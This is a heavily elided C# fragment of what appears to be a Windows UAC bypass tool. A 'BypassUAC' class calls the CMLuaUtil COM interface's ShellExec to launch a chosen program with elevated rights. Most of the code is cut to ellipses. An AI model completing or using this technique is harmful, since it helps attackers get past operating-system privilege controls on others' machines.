...
namespace BypassUAC
{
	public class Bypass
	{
		...
		private static bool ucmCMLuaUtilShellExecMethod(string executable)
		{
			...
			try
			{
				...
				{
					int shellExecResult = cmluaUtil.ShellExec(executable, null, null,
		...
		public static void ExecuteBypass()
		{
			...
			if (!string.IsNullOrEmpty(programPath))
			{
				...
				ucmCMLuaUtilShellExecMethod(correctedPath);
			}
		}
	}
}
